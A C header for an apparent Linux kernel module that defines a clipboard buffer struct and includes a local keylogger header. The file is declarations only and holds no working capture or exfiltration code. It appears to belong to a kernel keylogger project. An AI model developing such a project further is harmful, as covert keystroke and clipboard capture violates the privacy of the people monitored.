#ifndef STRUCT_CLIPBOARD_H
#define STRUCT_CLIPBOARD_H

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/workqueue.h>
#include <linux/fs.h>
#include "struct_keylogger.h"
#include <linux/mutex.h>

#define CLIPBOARD_BUFFER_SIZE 1024

typedef struct CLIPBOARD
{
   
    char* clipboard_read_buffer;
    size_t clipboard_read_buffer_offset;
    char* clipboard_write_buffer;
    char main_clipboard_buffer[CLIPBOARD_BUFFER_SIZE];
    char back_clipboard_buffer[CLIPBOARD_BUFFER_SIZE];
}CLIPBOARD;


#endif